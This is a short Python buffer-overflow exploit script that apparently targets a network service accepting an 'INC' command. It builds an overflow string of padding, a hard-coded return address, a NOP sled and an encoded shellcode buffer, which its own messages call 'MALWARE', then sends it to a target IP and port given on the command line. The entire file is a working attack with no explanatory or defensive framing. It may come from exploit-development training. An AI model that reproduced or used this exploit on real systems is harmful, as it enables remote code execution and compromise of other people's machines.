import sys
import socket

targetIP = sys.argv[1]
targetPort = int(sys.argv[2])
length = int(sys.argv[3])

buf =  b""
buf += b"\xba\x16\x9b\xf7\x67\xda\xde\xd9\x74\x24\xf4\x58\x29"
buf += b"\xc9\xb1\x56\x31\x50\x13\x83\xe8\xfc\x03\x50\x19\x79"
buf += b"\x02\x9b\xcd\xff\xed\x64\x0d\x60\x67\x81\x3c\xa0\x13"
buf += b"\xc1\x6e\x10\x57\x87\x82\xdb\x35\x3c\x11\xa9\x91\x33"
buf += b"\x92\x04\xc4\x7a\x23\x34\x34\x1c\xa7\x47\x69\xfe\x96"
buf += b"\x87\x7c\xff\xdf\xfa\x8d\xad\x88\x71\x23\x42\xbd\xcc"
buf += b"\xf8\xe9\x8d\xc1\x78\x0d\x45\xe3\xa9\x80\xde\xba\x69"
buf += b"\x22\x33\xb7\x23\x3c\x50\xf2\xfa\xb7\xa2\x88\xfc\x11"
buf += b"\xfb\x71\x52\x5c\x34\x80\xaa\x98\xf2\x7b\xd9\xd0\x01"
buf += b"\x01\xda\x26\x78\xdd\x6f\xbd\xda\x96\xc8\x19\xdb\x7b"
buf += b"\x8e\xea\xd7\x30\xc4\xb5\xfb\xc7\x09\xce\x07\x43\xac"
buf += b"\x01\x8e\x17\x8b\x85\xcb\xcc\xb2\x9c\xb1\xa3\xcb\xff"
buf += b"\x1a\x1b\x6e\x8b\xb6\x48\x03\xd6\xde\xbd\x2e\xe9\x1e"
buf += b"\xaa\x39\x9a\x2c\x75\x92\x34\x1c\xfe\x3c\xc2\x15\xe8"
buf += b"\xbe\x1c\x9d\x79\x41\x9d\xdd\x50\x86\xc9\x8d\xca\x2f"
buf += b"\x72\x46\x0b\xcf\xa7\xf2\x01\x47\x88\xaa\xdb\xbf\x60"
buf += b"\xa8\xe3\x9f\x95\x25\x05\x8f\x05\x65\x9a\x70\xf6\xc5"
buf += b"\x4a\x19\x1c\xca\xb5\x39\x1f\x01\xde\xd0\xf0\xff\xb6"
buf += b"\x4c\x68\x5a\x4c\xec\x75\x71\x28\x2e\xfd\x73\xcc\xe1"
buf += b"\xf6\xf6\xde\x16\x61\xf8\x1e\xe7\x04\xf8\x74\xe3\x8e"
buf += b"\xaf\xe0\xe9\xf7\x87\xae\x12\xd2\x94\xa9\xed\xa3\xac"
buf += b"\xc2\xd8\x31\x90\xbc\x24\xd6\x10\x3d\x73\xbc\x10\x55"
buf += b"\x23\xe4\x43\x40\x2c\x31\xf0\xd9\xb9\xba\xa0\x8e\x6a"
buf += b"\xd3\x4e\xe8\x5d\x7c\xb1\xdf\xdd\x7b\x4d\x9d\xc9\x23"
buf += b"\x25\x5d\x4a\xd4\xb5\x37\x4a\x84\xdd\xcc\x65\x2b\x2d"
buf += b"\x2c\xac\x64\x25\xa7\x21\xc6\xd4\xb8\x6b\x86\x48\xb8"
buf += b"\x98\x13\x7b\xc3\xd1\xa4\x7c\x34\xf8\xc0\x7d\x34\x04"
buf += b"\xf7\x42\xe2\x3d\x8d\x85\x36\x7a\x9e\xb0\x1b\x2b\x35"
buf += b"\xba\x08\x2b\x1c"



try:
    print("Trying " + str(length) + " number of integers!")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((targetIP, targetPort))

    data = s.recv(1024)
    print("RIGHT ABOVE BADSTR BLOCK")
    badstr = "INC " + ("0" * length)
    print("GARBAGE ADDED TO BADSTR")
    badstr = badstr.encode() + b"\x49\x22\x35\x50"
    print("MEM ADD ADDED TO BADSTR")
    badstr = badstr + (b"\x90" * 10)
    print("NOP SLED ADDED")
    badstr = badstr + buf
    print("MALWARE ADDED TO BADSTR")
    badstr = badstr + "\r\n".encode()
    print("Enter command added")
    s.send(badstr)
    print("badstr sent")
    data = s.recv(1024)
    s.close()
    print(str(length) + " integers was a success!")


except:
    print("Inc server has crashed!")
